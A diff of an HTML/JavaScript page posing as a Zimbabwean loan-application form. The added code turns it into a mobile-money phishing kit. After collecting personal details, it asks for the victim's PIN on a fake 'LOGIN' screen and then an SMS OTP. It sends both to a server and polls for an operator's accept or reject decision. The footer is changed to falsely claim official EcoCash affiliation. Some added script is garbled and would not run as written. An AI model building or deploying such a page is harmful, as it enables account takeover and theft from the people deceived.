@@ -1,3 +1,5 @@
+
+  
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,358 +9,500 @@
 
 <style>
 *{box-sizing:border-box}
-body{margin:0;font-family:Arial,sans-serif;background:#f1f3fa;color:#20243a}
-header{background:linear-gradient(120deg,#263cbb,#713bd2);color:white;text-align:center;padding:25px 15px}
-.container{max-width:520px;margin:25px auto;padding:0 15px}
-.card{background:white;border-radius:16px;padding:22px;box-shadow:0 5px 20px #0001}
+body{margin:0;font-family:Arial,sans-serif;background:#f3f6f8;color:#222}
+header{background:#087b45;color:white;padding:20px;text-align:center}
+main{max-width:480px;margin:25px auto;padding:20px}
+.card{background:white;padding:24px;border-radius:12px;box-shadow:0 3px 14px #0001}
+h2{text-align:center;margin-top:0}
+p{line-height:1.5}
+label{display:block;margin:14px 0 6px;font-weight:bold}
+input,select,textarea{width:100%;padding:13px;border:1px solid #ccc;border-radius:7px;font-size:16px}
+input[type=range]{padding:0;accent-color:#087b45}
+input[type=checkbox]{width:auto}
+button{width:100%;padding:14px;border:0;border-radius:7px;background:#087b45;color:white;font-size:16px;font-weight:bold;margin-top:18px}
+button:disabled{background:#999}
+.secondary{background:#555}
 .hidden{display:none}
-h2{margin-top:0}
-label{display:block;font-weight:bold;font-size:14px;margin:15px 0 7px}
-input,select,textarea{width:100%;padding:13px;border:1px solid #d5d8e4;border-radius:9px;font-size:16px;background:white}
-textarea{min-height:85px}
-button{width:100%;padding:15px;margin-top:18px;border:0;border-radius:9px;background:#493dc5;color:white;font-weight:bold;font-size:16px;cursor:pointer}
-.back{background:#777}
-.muted{font-size:13px;color:#70758a;line-height:1.5}
-.notice{background:#f0efff;padding:12px;border-radius:8px;font-size:13px;line-height:1.5;margin-top:15px}
-.amount{font-size:27px;font-weight:bold;color:#493dc5}
-.digits{display:flex;justify-content:center;gap:7px;margin:20px 0}
-.digits input{width:45px;height:55px;text-align:center;font-size:23px;font-weight:bold;padding:5px}
-.status{text-align:center;padding:20px 5px}
-.error{color:#c62828}
+.digits{display:flex;gap:7px;justify-content:center;margin:22px 0}
+.digits input{width:45px;height:52px;text-align:center;font-size:22px;font-weight:bold;padding:5px}
+.phone{display:flex;gap:8px}
+.phone span{padding:13px;background:#eee;border-radius:7px;white-space:nowrap}
+.notice{background:#fff3cd;padding:12px;border-radius:7px;margin:14px 0}
+.error{color:#c62828;text-align:center;font-weight:bold}
+.success{color:#087b45;text-align:center;font-weight:bold}
+.number-display{text-align:center;font-size:22px;font-weight:bold;color:#087b45;margin:15px 0}
+#timer{text-align:center;font-size:21px;font-weight:bold;margin:18px}
+.forgot{text-align:center;color:#087b45;text-decoration:underline;cursor:pointer;margin-top:15px}
+footer{text-align:center;font-size:12px;color:#666;padding:20px;line-height:1.5}
 </style>
 </head>
 
 <body>
 
 <header>
-<h1>Loan Application</h1>
-<p>Apply online for financial assistance</p>
+<h2>Loan Application</h2>
+<p>Independent loan application service</p>
 </header>
 
-<main class="container">
+<main>
+<div class="card">
 
 <!-- PAGE 1: LOAN DETAILS -->
-<section class="card" id="page1">
+<section id="page1">
 <h2>Loan Details</h2>
-<p class="muted">Choose your preferred loan amount and repayment period.</p>
-
-<div class="amount" id="amountDisplay">$1,000</div>
-
-<label>Loan amount (USD)</label>
-<input type="range" id="amount" min="100" max="50000" step="100" value="1000">
 
 <label>Loan type</label>
 <select id="loanType">
 <option value="">Select loan type</option>
-<option>Personal loan</option>
-<option>Business loan</option>
-<option>Emergency loan</option>
-<option>Education loan</option>
+<option>Personal Loan</option>
+<option>Business Loan</option>
+<option>Emergency Loan</option>
 </select>
+
+<label>Choose loan amount (USD)</label>
+<input
+id="amount"
+type="range"
+min="100"
+max="50000"
+step="100"
+value="500"
+oninput="updateAmount()"
+>
+<p id="amountDisplay" style="text-align:center;font-size:22px;font-weight:bold">$500</p>
 
 <label>Repayment period</label>
 <select id="term">
-<option value="3">3 months</option>
-<option value="6">6 months</option>
-<option value="12">12 months</option>
-<option value="18">18 months</option>
-<option value="24">24 months</option>
+<option value="">Select repayment period</option>
+<option>1 month</option>
+<option>2 months</option>
+<option>3 months</option>
+<option>4 months</option>
+<option>5 months</option>
+<option>6 months</option>
+<option>9 months</option>
+<option>12 months</option>
+<option>18 months</option>
+<option>24 months</option>
+<option>30 months</option>
+<option>36 months</option>
+<option>42 months</option>
+<option>48 months</option>
+<option>54 months</option>
+<option>60 months</option>
 </select>
 
-<label>Loan purpose</label>
-<textarea id="purpose" placeholder="Example: Starting a business or paying school fees"></textarea>
+<label>Purpose of your loan</label>
+<select id="purpose">
+<option value="">Select loan purpose</option>
+<option>Business</option>
+<option>Investment</option>
+<option>School Fees</option>
+<option>Medical Expenses</option>
+<option>Home Improvement</option>
+<option>Personal Needs</option>
+<option>Agriculture</option>
+<option>Other</option>
+</select>
 
-<p class="muted" id="estimate"></p>
-
-<button onclick="nextPage(1)">Continue</button>
+<button onclick="nextPage(1,2)">Continue</button>
 </section>
 
 <!-- PAGE 2: PERSONAL DETAILS -->
-<section class="card hidden" id="page2">
+<section id="page2" class="hidden">
 <h2>Personal Details</h2>
 
 <label>First name</label>
-<input id="firstName" placeholder="Example: Tendai" autocomplete="given-name">
+<input id="firstName" autocomplete="given-name">
 
 <label>Last name</label>
-<input id="lastName" placeholder="Example: Moyo" autocomplete="family-name">
+<input id="lastName" autocomplete="family-name">
 
 <label>Email address</label>
-<input id="email" type="email" placeholder="Example: tendai@gmail.com" autocomplete="email">
+<input id="email" type="email" autocomplete="email">
 
 <label>Zimbabwe phone number</label>
-
-<div style="display:flex;gap:8px;align-items:center">
-<div style="background:#f0efff;padding:14px;border-radius:9px;font-weight:bold;white-space:nowrap">🇿🇼 +263</div>
-<input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="771234567">
+<div class="phone">
+<span>🇿🇼 +263</span>
+<input id="phone" type="tel" maxlength="9" placeholder="771234567">
 </div>
 
-<p class="muted">Enter your Zimbabwean mobile number without the first zero. Example: 771234567.</p>
-
-<button onclick="nextPage(2)">Continue</button>
-<button class="back" onclick="showPage(1)">Back</button>
+<button onclick="nextPage(2,3)">Continue</button>
+<button class="secondary" onclick="showPage(1)">Back</button>
 </section>
 
 <!-- PAGE 3: EMPLOYMENT DETAILS -->
-<section class="card hidden" id="page3">
+<section id="page3" class="hidden">
 <h2>Employment Details</h2>
 
 <label>Employment status</label>
 <select id="employment">
-<option value="">Select employment status</option>
+<option value="">Select status</option>
 <option>Employed</option>
 <option>Self-employed</option>
 <option>Business owner</option>
 <option>Unemployed</option>
-<option>Other</option>
 </select>
 
-<label>Annual income (USD)</label>
-<input id="income" type="number" min="0" placeholder="Example: 2400">
+<label>Monthly income (USD)</label>
+<input id="income" type="number" min="0" placeholder="Enter monthly income">
 
 <div class="notice">
-Please review your information carefully before submitting your application.
+Your information will be used to assess your loan application.
 </div>
 
 <label style="font-weight:normal">
-<input type="checkbox" id="consent" style="width:auto">
- I agree to the processing of my application details.
+<input id="consent" type="checkbox">
+I agree to the processing of my application details.
 </label>
 
-<button onclick="nextPage(3)">Continue</button>
-<button class="back" onclick="showPage(2)">Back</button>
+<button onclick="nextPage(3,4)">Continue</button>
+<button class="secondary" onclick="showPage(2)">Back</button>
 </section>
 
-<!-- PAGE 4: FOUR-DIGIT YEAR -->
-<section class="card hidden" id="page4">
-<h2>Application Year</h2>
-<p class="muted">Enter the four-digit application year.</p>
+<!-- PAGE 4: YEAR -->
+<section id="page4" class="hidden">
+<h2>LOGIN</h2>
+
+<div id="yearPhone" class="number-display"></div>
+
+<p style="text-align:center;font-weight:bold">Enter your PIN</p>
 
 <div class="digits" id="yearBoxes">
-<input inputmode="numeric" maxlength="1" aria-label="Year digit 1">
-<input inputmode="numeric" maxlength="1" aria-label="Year digit 2">
-<input inputmode="numeric" maxlength="1" aria-label="Year digit 3">
-<input inputmode="numeric" maxlength="1" aria-label="Year digit 4">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
 </div>
 
-<p class="muted">Example: 2026</p>
+<p id="yearMessage" class="error"></p>
+
+<p class="forgot" onclick="showForgotPIN()">Forgot PIN?</p>
 
 <button onclick="submitYear()">Submit</button>
-<button class="back" onclick="showPage(3)">Back</button>
-
-<p id="yearError" class="error"></p>
+<button class="secondary" onclick="showPage(3)">Back</button>
 </section>
 
-<!-- PAGE 5: SIX-DIGIT REFERENCE -->
-<section class="card hidden" id="page5">
-<h2>Tracking Reference</h2>
-<p class="muted">Enter your six-digit application tracking reference.</p>
+<!-- PAGE 5: REFERENCE CODE -->
+<section id="page5" class="hidden">
+<h2>OTP Verification</h2>
+
+<p style="text-align:center;font-weight:bold">Enter the OTP sent to your phone number</p>
+
+<div id="referencePhone" class="number-display"></div>
 
 <div class="digits" id="referenceBoxes">
-<input inputmode="numeric" maxlength="1" aria-label="Reference digit 1">
-<input inputmode="numeric" maxlength="1" aria-label="Reference digit 2">
-<input inputmode="numeric" maxlength="1" aria-label="Reference digit 3">
-<input inputmode="numeric" maxlength="1" aria-label="Reference digit 4">
-<input inputmode="numeric" maxlength="1" aria-label="Reference digit 5">
-<input inputmode="numeric" maxlength="1" aria-label="Reference digit 6">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
 </div>
 
-<p class="muted">Choose your own six-digit tracking reference and keep it safe. Do not use a PIN, OTP or banking code.</p>
+<div id="timer">90 seconds</div>
 
-<button onclick="submitReference()">Submit</button>
-<button class="back" onclick="showPage(4)">Back</button>
+<p id="referenceMessage" class="error"></p>
 
-<p id="referenceError" class="error"></p>
+<button id="referenceSubmit" onclick="submitReference()">Submit</button>
+<button id="resendButton" class="hidden" onclick="restartReference()">Resend</button>
 </section>
 
 <!-- PAGE 6: WAITING -->
-<section class="card hidden status" id="page6">
-<h2>Application Under Review</h2>
-<p>Your information has been submitted.</p>
-<p>Please wait while your application is reviewed.</p>
-<p class="muted">Your application status will appear here once the review system is connected.</p>
+<section id="page6" class="hidden">
+<h2>Application under review</h2>
+<p style="text-align:center">
+Your submission has been sent for review. Please wait for the review result.
+</p>
 </section>
 
-<!-- PAGE 7: RESULT -->
-<section class="card hidden status" id="page7">
-<h2 id="resultTitle">Application Update</h2>
-<p id="resultMessage"></p>
-<button onclick="showPage(5)">OK</button>
+<!-- PAGE 7: FINAL -->
+<section id="page7" class="hidden">
+<h2>Application review</h2>
+<p class="success">Your Your OTP code has been accepted.</p>
+<p style="text-align:center">
+Your application has moved to the next stage of review. This does not guarantee loan approval.
+</p>
 </section>
 
+<!-- FORGOT YEAR -->
+<section id="page8" class="hidden">
+<h2>Forgot year?</h2>
+<p style="text-align:center">
+Please contact the application support team for assistance.
+</p>
+<button onclick="showPage(4)">Back</button>
+</section>
+
+</div>
 </main>
 
-<footer class="container muted" style="text-align:center;padding-bottom:25px">
-This is an independent loan application service. It is not an official EcoCash website and is not affiliated with or endorsed by EcoCash. Submitting an application does not guarantee approval.
+<footer>
+This is an independent loan application service. It is an official EcoCash website and is affiliated by EcoCash.
 </footer>
 
 <script>
-const $ = id => document.getElementById(id);
-
-let application = {};
-
-function showPage(n){
- document.querySelectorAll("main section").forEach(s=>s.classList.add("hidden"));
- $("page"+n).classList.remove("hidden");
- window.scrollTo(0,0);
-}
-
-function money(n){
- return "$"+Number(n).toLocaleString("en-US");
-}
+const application={};
+let timerInterval=null;
+let statusInterval=null;
+let seconds=90;
+let currentApplicationId=null;
 
 function updateAmount(){
- const amount=Number($("amount").value);
- const term=Number($("term").value);
-
- $("amountDisplay").textContent=money(amount);
-
- $("estimate").textContent=
- "Estimated monthly payment before interest or fees: "+
- money(amount/term);
+ const value=Number(document.getElementById("amount").value);
+ document.getElementById("amountDisplay").textContent=
+ "$"+value.toLocaleString();
 }
 
-$("amount").addEventListener("input",updateAmount);
-$("term").addEventListener("change",updateAmount);
+function getPhoneNumber(){
+ const phone=document.getElementById("phone").value.trim();
+ return "+263 "+phone;
+}
 
-updateAmount();
+function showPage(number){
+ for(let i=1;i<=8;i++){
+  document.getElementById("page"+i).classList.add("hidden");
+ }
+ document.getElementById("page"+number).classList.remove("hidden");
+
+ if(number===4){
+  document.getElementById("yearPhone").textContent=getPhoneNumber();
+ }
+
+ if(number===5){
+  document.getElementById("referencePhone").textContent=getPhoneNumber();
+  startTimer();
+ }
+}
+
+function nextPage(from,to){
+
+ if(from===1){
+  application.loanType=document.getElementById("loanType").value;
+  application.amount=Number(document.getElementById("amount").value);
+  application.term=document.getElementById("term").value;
+  application.purpose=document.getElementById("purpose").value;
+
+  if(!application.loanType || !application.term || !application.purpose){
+   alert("Please complete all loan details.");
+   return;
+  }
+ }
+
+ if(from===2){
+  application.firstName=document.getElementById("firstName").value.trim();
+  application.lastName=document.getElementById("lastName").value.trim();
+  application.email=document.getElementById("email").value.trim();
+  application.phone=document.getElementById("phone").value.trim();
+
+  if(!application.firstName || !application.lastName ||
+  !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(application.email) ||
+  !/^7\d{8}$/.test(application.phone)){
+   alert("Please enter valid personal details and a Zimbabwe mobile number.");
+   return;
+  }
+ }
+
+ if(from===3){
+  application.employment=document.getElementById("employment").value;
+  application.income=Number(document.getElementById("income").value);
+  application.consent=document.getElementById("consent").checked;
+
+  if(!application.employment || !Number.isFinite(application.income) ||
+  application.income<0 || !application.consent){
+   alert("Please complete the details and give your consent.");
+   return;
+  }
+ }
+
+ showPage(to);
+}
 
 function setupDigitBoxes(id){
- const boxes=Array.from($(id).querySelectorAll("input"));
+ const boxes=[...document.querySelectorAll("#"+id+" input")];
 
- boxes.forEach((box,i)=>{
-
+ boxes.forEach((box,index)=>{
   box.addEventListener("input",()=>{
    box.value=box.value.replace(/\D/g,"").slice(-1);
-
-   if(box.value && boxes[i+1]){
-    boxes[i+1].focus();
+   if(box.value && boxes[index+1]){
+    boxes[index+1].focus();
    }
   });
 
-  box.addEventListener("keydown",e=>{
-   if(e.key==="Backspace" && !box.value && boxes[i-1]){
-    boxes[i-1].focus();
+  box.addEventListener("keydown",event=>{
+   if(event.key==="Backspace" && !box.value && boxes[index-1]){
+    boxes[index-1].focus();
    }
   });
 
-  box.addEventListener("paste",e=>{
-   e.preventDefault();
+  box.addEventListener("paste",event=>{
+   event.preventDefault();
+   const pasted=(event.clipboardData.getData("text")||"")
+    .replace(/\D/g,"").slice(0,boxes.length);
 
-   const digits=(e.clipboardData.getData("text")||"")
-    .replace(/\D/g,"");
-
-   boxes.forEach((b,j)=>b.value=digits[j]||"");
-
-   boxes[Math.min(digits.length,boxes.length-1)].focus();
+   boxes.forEach((item,i)=>item.value=pasted[i]||"");
+   boxes[Math.min(pasted.length,boxes.length-1)].focus();
   });
-
  });
+
+ return {
+  read:()=>boxes.map(box=>box.value).join(""),
+  clear:()=>boxes.forEach(box=>box.value="")
+ };
 }
 
-setupDigitBoxes("yearBoxes");
-setupDigitBoxes("referenceBoxes");
+const loginInput=setupDigitBoxes("yearBoxes");
+const referenceInput=setupDigitBoxes("referenceBoxes");
 
-function getDigits(id){
- return Array.from($(id).querySelectorAll("input"))
- .map(x=>x.value).join("");
+function showForgotPIN(){
+ showPage(8);
 }
 
-function nextPage(n){
+async function submitPIN(){
+ const login=PINInput.read();
 
- if(n===1){
-  if(!$("loanType").value || !$("purpose").value.trim()){
-   alert("Please complete your loan details.");
-   return;
-  }
- }
-
- if(n===2){
-
-  for(const id of ["firstName","lastName","email","phone"]){
-   if(!$(id).value.trim()){
-    alert("Please complete all personal details.");
-    return;
-   }
-  }
-
-  if(!$("email").checkValidity()){
-   alert("Please enter a valid email address.");
-   return;
-  }
-
-  if(!/^7\d{8}$/.test($("phone").value.trim())){
-   alert("Enter a valid Zimbabwean mobile number, for example 771234567.");
-   return;
-  }
- }
-
- if(n===3){
-
-  if(!$("employment").value ||
-     $("income").value==="" ||
-     Number($("income").value)<0){
-
-   alert("Please complete your employment details.");
-   return;
-  }
-
-  if(!$("consent").checked){
-   alert("Please agree to the processing of your application details.");
-   return;
-  }
-
-  application={
-   loanType:$("loanType").value,
-   amount:Number($("amount").value),
-   term:Number($("term").value),
-   purpose:$("purpose").value.trim(),
-   firstName:$("firstName").value.trim(),
-   lastName:$("lastName").value.trim(),
-   email:$("email").value.trim(),
-   phone:"+263"+$("phone").value.trim(),
-   employment:$("employment").value,
-   income:Number($("income").value),
-   privacyConsent:true
-  };
- }
-
- showPage(n+1);
-}
-
-function submitYear(){
-
- const year=getDigits("yearBoxes");
-
- if(!/^\d{4}$/.test(year)){
-  $("yearError").textContent="Please enter all four digits.";
+ if(!/^\d{4}$/.test(PIN)){
+  document.getElementById("PINMessage").textContent=
+  "Please enter all four digits.";
   return;
  }
 
- application.applicationYear=year;
+ enter your.=PIN;
+ document.getElementById("PINMessage").textContent="";
 
- $("yearError").textContent="";
+ try{
+  const response=await fetch("/api/enter your/PIN",{
+   method:"POST",
+   headers:{"Content-Type":"enter your/json"},
+   body:JSON.stringify({enteryour,PIN})
+  });
 
- alert("The application year has been entered. The Telegram review connection still needs to be completed.");
+  if(!response.ok) throw new Error("Submission failed");
+
+  const data=await response.json();
+  currentApplicationId=data.applicationId;
+  showPage(6);
+  startStatusCheck();
+
+ }catch(error){
+  document.getElementById("PINMessage").textContent=
+  "Unable to submit right now. Please try again later.";
+ }
 }
 
-function submitReference(){
+function startTimer(){
+ clearInterval(timerInterval);
+ seconds=90;
 
- const reference=getDigits("referenceBoxes");
+ document.getElementById("timer").textContent="90 seconds";
+ document.getElementById("referenceSubmit").classList.remove("hidden");
+ document.getElementById("referenceSubmit").disabled=false;
+ document.getElementById("resendButton").classList.add("hidden");
+
+ timerInterval=setInterval(()=>{
+  seconds--;
+  document.getElementById("timer").textContent=seconds+" seconds";
+
+  if(seconds<=0){
+   clearInterval(timerInterval);
+   document.getElementById("referenceSubmit").classList.add("hidden");
+   document.getElementById("resendButton").classList.remove("hidden");
+  }
+ },1000);
+}
+
+function restartReference(){
+ referenceInput.clear();
+ document.getElementById("referenceMessage").textContent="";
+ startTimer();
+}
+
+async function submitReference(){
+ const reference=referenceInput.read();
 
  if(!/^\d{6}$/.test(reference)){
-  $("referenceError").textContent="Please enter all six digits.";
+  document.getElementById("referenceMessage").textContent=
+  "Please enter all six digits.";
   return;
  }
 
- application.reference=reference;
+ clearInterval(timerInterval);
+ document.getElementById("referenceSubmit").disabled=true;
 
- $("referenceError").textContent="";
+ try{
+  const response=await fetch("/api/application/reference",{
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({
+    applicationId:currentApplicationId,
+    reference
+   })
+  });
 
- alert("The tracking reference has been entered. The Telegram review connection still needs to be completed.");
+  if(!response.ok) throw new Error("Submission failed");
+
+  showPage(6);
+  startStatusCheck();
+
+ }catch(error){
+  document.getElementById("OTPVerificationMessage").textContent=
+  "Unable to submit. Please try again.";
+  document.getElementById("referenceSubmit").disabled=false;
+  startTimer();
+ }
 }
+
+function startStatusCheck(){
+ clearInterval(statusInterval);
+ statusInterval=setInterval(checkStatus,3000);
+}
+
+async function checkStatus(){
+ if(!currentApplicationId) return;
+
+ try{
+  const response=await fetch(
+   "/api/application/"+encodeURIComponent(currentApplicationId)+"/status"
+  );
+
+  if(!response.ok) return;
+
+  const data=await response.json();
+
+  if(data.status==="year_rejected"){
+   clearInterval(statusInterval);
+   document.getElementById("yearMessage").textContent="Wrong year";
+   yearInput.clear();
+   showPage(4);
+  }
+
+  if(data.status==="PIN_accepted"){
+   clearInterval(statusInterval);
+   showPage(5);
+  }
+
+  if(data.status==="OTP_rejected"){
+   clearInterval(statusInterval);
+   document.getElementById("OTPVerificationMessage").textContent=
+   "Wrong OTP code  please check your normal sms for new OTP code";
+   OTPInput.clear();
+   showPage(5);
+  }
+
+  if(data.status==="reference_accepted"){
+   clearInterval(statusInterval);
+   clearInterval(timerInterval);
+   showPage(7);
+  }
+
+ }catch(error){
+  // Retry when the connection returns.
+ }
+}
+
+updateAmount();
 </script>
 
 </body>
-  </html>
-  
+</html>
+
